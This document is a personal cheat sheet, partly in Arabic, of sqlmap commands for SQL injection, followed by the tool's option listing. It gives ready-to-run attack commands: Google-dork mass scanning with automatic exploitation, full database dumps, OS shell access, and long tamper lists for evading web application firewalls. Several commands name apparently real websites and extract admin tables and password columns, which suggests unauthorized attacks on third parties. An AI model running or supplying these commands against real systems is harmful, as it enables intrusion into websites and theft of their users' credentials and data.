install python lib on windows : 
using : Python Package Manager (PyPM)
go start == search cmd 

then write :
# pypm install python-ntlm

windows 
# pip install -r requirements.txt
# pip install SomePackage
#####################################################

Running sqlmap with Google Dork :

python sqlmap.py -g 'inurl:"article.php?id="' --random-agent --batch --answer="extending=N,follow=N,keep=N,exploit=Y" --dbs --thread 5

python sqlmap.py -m simple.txt --random-agent --batch --answer="extending=N,follow=N,keep=N,exploit=Y" --thread 5 --dbs --output-dir="/tmp/data-sqli/"

-m: file that contain links need to test.

Enumerate DBMS databases:
python sqlmap.py -u 'http://example.com/product?id=1’ -p 'id' --dbs

Dump all DBMS databases tables entries:
python sqlmap.py -u 'http://example.com/product?id=1’ -p 'id' --dump-all

Enumerate DBMS database tables:
python sqlmap.py -u 'http://example.com/product?id=1’ -p 'id' -D somedb --tables

Dump data from specific database or talbes:
python sqlmap.py -u 'http://example.com/product?id=1’ -p 'id' -D somedb -T sometable --dump


Revershell with sqlmap:
--os-shell: revershsell by upload UDF function (not work with all case)

Custom sql query:
--sql-shell: Prompt for an interactive SQL shell (basically you can run any sql query)

resource : 
https://j3ssiejjj.blogspot.com/2017/11/advanced-sqlmap-metasploit-for-sql.html
######################################################
Find sql injection :
I initially noticed that the following URLs returned the same page:

http://host/script?id=10
http://host/script?id=11-1 # same as id=10
http://host/script?id=(select 10) # same as id=10
http://host/script?id=10 and 1=1 # failed

http://host/script?id=10-- # failed
http://host/script?id=10;-- # failed
http://host/script?id=10);-- # failed
http://host/script?id=10)subquery;-- # failed

 http://host/script?id=11-(case when 1=1 then 1 else 0 end)

sqlmap.py -v 2 --url=http://mysite.com/index --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2 
--keep-alive --threads=5 --eta --batch --dbms=MySQL --os=Linux --level=5 --risk=4 --banner --is-dba --dbs --tables --technique=BEUST 
-s /tmp/scan_report.txt --flush-session -t /tmp/scan_trace.txt --fresh-queries > /tmp/scan_out.txt

sqlmap.py --url "xxxx" --cookie "xxxxxx" -p xxxx --dbs
sqlmap.py --url "xxxx" --cookie "xxxxxx" -p xxxx --dbms "Microsoft SQL Server 2012"
sqlmap.py -u "http://192.168.1.100/fancyshmancy/login.aspx" --method POST --data "usernameTxt=blah&passwordTxt=blah&submitBtn=Log+On" -p "usernameTxt" --prefix="')" --dbms=mssql -v 2
sqlmap.py -r E:\zj.txt --dbms=mssql --technique=B --risk=3 --level=3 --string="1484" --dbs --current-user --current-db --users
sqlmap.py -r E:\ah.txt --dbms=mssql --technique=B --risk=3 --level=3 --string="1332" --dbs --current-user --current-db --is-DBA
sqlmap.py --random-agent --time-sec=20 --technique=BEUS --union-char=N --answers="extending=N,skip=Y,follow=N,quite=Y" -u "http://xxxxx/ecem_asso/" --data="xxxxxx --dbs

sqlmap.py -r hackme.txt -p txtUserName --dbms=MSSQL --technique=S
sqlmap.py -r hackme.txt -p txtUserName --dbms=MSSQL --technique=S --os-cmd=hostname
sqlmap.py -r hackme.txt -p txtUserName --dbms=MSSQL --technique=S --os-shell

--dbms=MSSQL

@############################################################

sqlmap.py -r search-test.txt -p title --technique=BEUST --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords --dbms=MySQL --dbs --risk 3 --level 3 -v 3 --prefix "'" -s D:\report\client\scan_report.txt --flush-session -t D:\report\client\scan_trace.txt --fresh-queries --batch 


--batch : use the default behaviour, for example: it is not recommended -- [snip] -- Do you want to skip? [Y/n]
In this case 'Y' is default and use --batch option will skip that question and use 'Y'


SQL Injection and WAF bypass :
sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1’ --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords


General Tamper testing:
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes

MSSQL:

tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes

MySQL:
tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor


Oracle  :

tamper=between,charencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor

Microsoft Access:
--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekey
words,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentag
e,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2rand
omblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords

PostgreSQL:

--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percent
age,randomcase,securesphere,space2comment,space2plus,space2randomblank,xforwardedfor


SAP MaxDB :

--tamper=ifnull2ifisnull,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,unionalltounion,unmagic
quotes,xforwardedfor

SQLite :

--tamper=ifnull2ifisnull,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2dash,space2p
lus,unionalltounion,unmagicquotes,xforwardedfor

@############################################################

اذا فيه فورم نريد نفحصه
Auto detect the forms

$ ./sqlmap.py -u http://192.168.60.138 --forms
$ ./sqlmap.py -u http://192.168.60.138 --forms --dbms=MySQL

##########################################################3
حل مشكلة ظهور خطاء sql map connection timed out to the target URL or proxy
نضيف امر --random-agent


application to connect to DB if you have database config:
HeidiSQL


proxy sqlmap :

C:\sqlmap>sqlmap.py -u http://IP/xxxx/file.php?user_id= --proxy="http://LOCALHOST:8080" --dbs

session id :
--cookie"PHPSESSID=sf7bjdnengngobitas5827qu46"
or
--cookie"sf7bjdnengngobitas5827qu46"
############### POST SQL iNJCTION ##########################3

1. Browse to target site XXXX.COM
2. Configure Burp proxy, point browser Burp (127.0.0.1:8080) with Burp set to intercept in the proxy tab.
3. Click on the submit button on the login form
4. Burp catches the POST request and waits

sqlmap.py -r search-test.txt -p tfUPass --technique=BEUST --risk=3 --level=3 --dbs
or
sqlmap.py -r search-test.txt -p ider --dbms=MySQL --technique=BEUST --random-agent --threads 5 --level=5 --risk=3 --delay=1 --timeout=15 --retries=2 --dbs

COPY AND put post request from burp suite in search-test.txt

tfUPass= the parameter want test it like username=,password=,category,login,tfUPass=XXX ..etc


how to change technique like blind sql ..etc

--technique=BEUST 

sqlmap.py -v 2 --url=http://mysite.com/index --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2 
--keep-alive --threads=5 --eta --batch --dbms=MySQL --os=Linux --level=5 --risk=4 --banner --is-dba --dbs --tables --technique=BEUST 
-s /tmp/scan_report.txt --flush-session -t /tmp/scan_trace.txt --fresh-queries > /tmp/scan_out.txt

http://www.it-docs.net/ddata/4956.pdf



Bypass firewall :

sqlmap -u 'URL' --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords




General Tamper testing:
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes


MSSQL:
tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes

MySQL:

tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor


sqlmap.py -u URL -v 3 --dbms "MySQL" --technique U -p id --batch --tamper "space2morehash.py"

CHANGE tamper TO # 

apostrophemask.py 
# for Replaces apostrophe character with its UTF-8 full width counterpart EX : '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'

apostrophenullencode.py
# Replaces apostrophe character with its illegal double unicode counterpart	 EX : '1 AND %271%27=%271'

appendnullbyte.py
# Appends encoded NULL byte character at the end of payload	EX : '1 AND 1=1'

base64encode.py
# Base64 all characters in a given payload	EX 'MScgQU5EIFNMRUVQKDUpIw=='

between.py
# Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #'	EX: '1 AND A NOT BETWEEN 0 AND B--'

bluecoat.py
# Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator
EX : 'SELECT%09id FROM users where id LIKE 1'

chardoubleencode.py
# Double url-encodes all characters in a given payload (not processing already encoded)	EX : '%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545'

charencode.py
# Url-encodes all characters in a given payload (not processing already encoded) EX : '%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45'


charunicodeencode.py
# Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded) EX : '%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045'

equaltolike.py
# Replaces all occurances of operator equal ('=') with operator 'LIKE'	EX : 'SELECT * FROM users WHERE id LIKE 1'


greatest.py
# Replaces greater than operator ('>') with 'GREATEST' counterpart	EX : '1 AND GREATEST(A,B+1)=A'


halfversionedmorekeywords.py
# Adds versioned MySQL comment before each keyword	EX : "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"



ifnull2ifisnull.py
Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'	EX : 'IF(ISNULL(1),2,1)'


modsecurityversioned.py	
Embraces complete query with versioned comment	# EX : '1 /*!30874AND 2>1*/--'


modsecurityzeroversioned.py	
# Embraces complete query with zero-versioned comment EX : '1 /*!00000AND 2>1*/--'


multiplespaces.py
# Adds multiple spaces around SQL keywords	EX : '1 UNION SELECT foobar'


nonrecursivereplacement.py
# Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters	
EX : '1 UNIOUNIONN SELESELECTCT 2--'


MORE : http://www.forkbombers.com/2013/05/sqlmaps-tamper-scripts.html
########################################################################################################

############### sqlmap ###################

sqlmap -u www.26sep.net/ntopics.php?id=8 --dbms=MySQL --risk=3 --level=3 --drop-set-cookie --random-agent --dbs

sqlmap -u http://www.hoduniv.net.ye/center.php?id=1 -D hoduniv --tables
sqlmap -u www.hoduniv.net.ye/center.php?id=1 -D hoduniv -T users -C user_id,user_name,user_type,password --dump --random-agent

---==========----------------============------------------------
#Will check URL to dump DB's with 5 threads.
./sqlmap -u <url> --dbs --threads 5 
--=======================--------------===================-------
---==========----------------============------------------------
#Will grab Tables from chosen DB's with 5 threads.
./sqlmap.py -u <url> -D <database> --tables --threads 5
--=======================--------------===================-------
---============----------===============----------=----------------
#Will grab Colums from chosen database with 5 threads.
./sqlmap.py -u <url> -D <database> -T <table> --columns --threads 5
--=======================--------------===================-------
-=======----------===============----------------==================----
#Will dump column data.
./sqlmap.py -u <url> -D <database> -T <table> -U <table> --threads 5 --dump
--=======================--------------===================-------



notes sqlmap more
Hasan Alqawzai   10/14/2015   Keep this message at the top of your inbox  
To: lpp@hotmail.com

---==========----------------============------------------------
#Will check URL to dump DB's with 5 threads.
./sqlmap -u <url> --dbs --threads 5 
--=======================--------------===================-------
---==========----------------============------------------------
#Will grab Tables from chosen DB's with 5 threads.
./sqlmap.py -u <url> -D <database> --tables --threads 5
--=======================--------------===================-------
---============----------===============----------=----------------
#Will grab Colums from chosen database with 5 threads.
./sqlmap.py -u <url> -D <database> -T <table> --columns --threads 5
--=======================--------------===================-------
-=======----------===============----------------==================----
#Will dump column data.
./sqlmap.py -u <url> -D <database> -T <table> -U <table> --threads 5 --dump
--=======================--------------===================-------




python sqlmap.py -u www.exp.com --dbs

python sqlmap.py -u www.exp.com -D uwade_data --tables

python sqlmap.py -u www.exp.com -D uwade_data -T users --columns

python sqlmap.py -u www.exp.com -D uwade_data -T users -C user --dump

python sqlmap.py -u www.exp.com -D uwade_data -T users -C password --dump


http://pastebin.com/C9PB023W
http://pastebin.com/pGQ0z8Wb


python sqlmap.py -u http://localhost/index.php?id=1337

python sqlmap.py -u http://localhost/index.php?id=1337 --dbs
sqlmap -u http://www.amb-inde-bamako.org/newsdetail.php?id=58 -D jadon_eoimali --table
sqlmap -u http://www.amb-inde-bamako.org/newsdetail.php?id=58 -D jadon_eoimali -T eoimali_admin --columns
sqlmap -u http://www.amb-inde-bamako.org/newsdetail.php?id=58 -D jadon_eoimali -T eoimali_admin -C password --dump

-u is url website
--dbs to find DataBases
--users to find users

--tables Option to enumerate tables with sqlmap.
-D database_name to restrict result to the specified database.

--dbs List databases using sqlmap.
--users List database system users using sqlmap.
--is-dba Find Out If Session User Is Database Administrator using sqlmap.
--columns Option to enumerate columns with sqlmap.



python sqlmap.py -u http://localhost/index.php?id=1337 --dbs (and/or) --users

python sqlmap.py -u http://localhost/index.php?id=1337 --tables -D database1

This tells the program to find tables (--tables) in database (-D) names: database1.
Once you execute this you will find (maybe) tons of tables. Locate the one you want...lets call it admin!


python sqlmap.py -u http://localhost/index.php?id=1337 -D database1 -T admin

python sqlmap.py -u http://localhost/index.php?id=1337 --tables -D database1 --dump-all
python sqlmap.py -u http://localhost/index.php?id=1337 -D database1 -T admin --dump
--dump dumps the selected tables content, --dump-all dumps EVERYTHING!

Test POST Parameters Using Sqlmap 
python sqlmap.py --data "username=xyz&password=xyz&submit=xyz" -u "http://127.0.0.1:8888/cases/login.php"

By default sqlmap tests only GET parameter but you can specify POST parameters you would like to verify. Sqlmap will then test both GET and POST parameters indicated. In order to do so, add the --data option like shown below.


Sqlmap has a built-in functionality to parse all forms in a webpage and automatically test them. Even though in some cases the scan may not be as efficient as it is when manually indicating all parameters, it is still handy in many situations. Here is the syntax:

python sqlmap.py --forms -u "http(s)://target[:port]/[...]/[page]"

Parse Forms with sqlmap

python sqlmap.py --forms -u "http://synapse:8888/cases/productsCategory.php"







############################################################
xxx.com/user.php?id=1' AND 1=1 #-BR

--suffix="-BR"
وضع قيمة -br في نهاية كل كود اسكيول
--prefix="-BR"
راح يضع في بداية كل كود اسكيول 
#######################################################################################################
Usage

./sqlmap.py (-d | -u | -l | -m | -r | -g | -c | --wizard | --update | --dependencies) [options]
Options

Version, help, verbosity

--version
show program's version number and exit
-h, --help
show this help message and exit
-v VERBOSE
Verbosity level: 0-6 (default 1)
Target

At least one of these options has to be specified to set the source to get target urls from.

   -d DIRECT           Direct connection to the database
   -u URL, --url=URL   Target url
   -l LIST             Parse targets from Burp or WebScarab proxy logs
   -r REQUESTFILE      Load HTTP request from a file
   -g GOOGLEDORK       Process Google dork results as target urls
   -c CONFIGFILE       Load options from a configuration INI file
Request

These options can be used to specify how to connect to the target url.

   --data=DATA         Data string to be sent through POST
   --cookie=COOKIE     HTTP Cookie header
   --cookie-urlencode  URL Encode generated cookie injections
   --drop-set-cookie   Ignore Set-Cookie header from response
   --user-agent=AGENT  HTTP User-Agent header
   --random-agent      Use randomly selected HTTP User-Agent header
   --referer=REFERER   HTTP Referer header
   --headers=HEADERS   Extra HTTP headers newline separated
   --auth-type=ATYPE   HTTP authentication type (Basic, Digest or NTLM)
   --auth-cred=ACRED   HTTP authentication credentials (name:password)
   --auth-cert=ACERT   HTTP authentication certificate (key_file,cert_file)
   --proxy=PROXY       Use a HTTP proxy to connect to the target url
   --proxy-cred=PCRED  HTTP proxy authentication credentials (name:password)
   --ignore-proxy      Ignore system default HTTP proxy
   --delay=DELAY       Delay in seconds between each HTTP request
   --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
   --retries=RETRIES   Retries when the connection timeouts (default 3)
   --scope=SCOPE       Regexp to filter targets from provided proxy log
   --safe-url=SAFURL   Url address to visit frequently during testing
   --safe-freq=SAFREQ  Test requests between two visits to a given safe url
Optimization

These options can be used to optimize the performance of sqlmap.

   -o                  Turn on all optimization switches
   --predict-output    Predict common queries output
   --keep-alive        Use persistent HTTP(s) connections
   --null-connection   Retrieve page length without actual HTTP response body
   --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
Injection

These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts.

   -p TESTPARAMETER    Testable parameter(s)
   --dbms=DBMS         Force back-end DBMS to this value
   --os=OS             Force back-end DBMS operating system to this value
   --prefix=PREFIX     Injection payload prefix string
   --suffix=SUFFIX     Injection payload suffix string
   --tamper=TAMPER     Use given script(s) for tampering injection data
Detection

These options can be used to specify how to parse and compare page content from HTTP responses when using blind SQL injection technique.

   --level=LEVEL       Level of tests to perform (1-5, default 1)
   --risk=RISK         Risk of tests to perform (0-3, default 1)
   --string=STRING     String to match in page when the query is valid
   --regexp=REGEXP     Regexp to match in page when the query is valid
   --text-only         Compare pages based only on the textual content
Techniques

These options can be used to tweak testing of specific SQL injection techniques.

   --technique=TECH    SQL injection techniques to test for (default BEUST)
   --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
   --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
   --union-char=UCHAR  Character to use for bruteforcing number of columns
Fingerprint

   -f, --fingerprint   Perform an extensive DBMS version fingerprint
Enumeration

These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements.

   -b, --banner        Retrieve DBMS banner
   --current-user      Retrieve DBMS current user
   --current-db        Retrieve DBMS current database
   --is-dba            Detect if the DBMS current user is DBA
   --users             Enumerate DBMS users
   --passwords         Enumerate DBMS users password hashes
   --privileges        Enumerate DBMS users privileges
   --roles             Enumerate DBMS users roles
   --dbs               Enumerate DBMS databases
   --tables            Enumerate DBMS database tables
   --columns           Enumerate DBMS database table columns
   --dump              Dump DBMS database table entries
   --dump-all          Dump all DBMS databases tables entries
   --search            Search column(s), table(s) and/or database name(s)
   -D DB               DBMS database to enumerate
   -T TBL              DBMS database table to enumerate
   -C COL              DBMS database table column to enumerate
   -U USER             DBMS user to enumerate
   --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
   --start=LIMITSTART  First query output entry to retrieve
   --stop=LIMITSTOP    Last query output entry to retrieve
   --first=FIRSTCHAR   First query output word character to retrieve
   --last=LASTCHAR     Last query output word character to retrieve
   --sql-query=QUERY   SQL statement to be executed
   --sql-shell         Prompt for an interactive SQL shell
Brute force

These options can be used to run brute force checks.

   --common-tables     Check existence of common tables
   --common-columns    Check existence of common columns
User-defined function injection

These options can be used to create custom user-defined functions.

   --udf-inject        Inject custom user-defined functions
   --shared-lib=SHLIB  Local path of the shared library
File system access

These options can be used to access the back-end database management system underlying file system.

   --file-read=RFILE   Read a file from the back-end DBMS file system
   --file-write=WFILE  Write a local file on the back-end DBMS file system
   --file-dest=DFILE   Back-end DBMS absolute filepath to write to
Operating system access

These options can be used to access the back-end database management system underlying operating system.

   --os-cmd=OSCMD      Execute an operating system command
   --os-shell          Prompt for an interactive operating system shell
   --os-pwn            Prompt for an out-of-band shell, meterpreter or VNC
   --os-smbrelay       One click prompt for an OOB shell, meterpreter or VNC
   --os-bof            Stored procedure buffer overflow exploitation
   --priv-esc          Database process' user privilege escalation
   --msf-path=MSFPATH  Local path where Metasploit Framework 3 is installed
   --tmp-path=TMPPATH  Remote absolute path of temporary files directory
Windows registry access

These options can be used to access the back-end database management system Windows registry.

   --reg-read          Read a Windows registry key value
   --reg-add           Write a Windows registry key value data
   --reg-del           Delete a Windows registry key value
   --reg-key=REGKEY    Windows registry key
   --reg-value=REGVAL  Windows registry key value
   --reg-data=REGDATA  Windows registry key value data
   --reg-type=REGTYPE  Windows registry key value type
General

These options can be used to set some general working parameters.

   -t TRAFFICFILE      Log all HTTP traffic into a textual file
   -s SESSIONFILE      Save and resume all data retrieved on a session file
   --flush-session     Flush session file for current target
   --fresh-queries     Ignores query results stored in session file
   --eta               Display for each output the estimated time of arrival
   --update            Update sqlmap
   --save              Save options on a configuration INI file
   --batch             Never ask for user input, use the default behaviour
Miscellaneous

   --beep              Alert when sql injection found
   --check-payload     IDS detection testing of injection payloads
   --cleanup           Clean up the DBMS by sqlmap specific UDF and tables
   --forms             Parse and test forms on target url
   --gpage=GOOGLEPAGE  Use Google dork results from specified page number
   --page-rank         Display page rank (PR) for Google dork results
   --parse-errors      Parse DBMS error messages from response pages
   --replicate         Replicate dumped data into a sqlite3 database
   --tor               Use default Tor (Vidalia/Privoxy/Polipo) proxy address
   --wizard            Simple wizard interface for beginner user
##########################################################################################
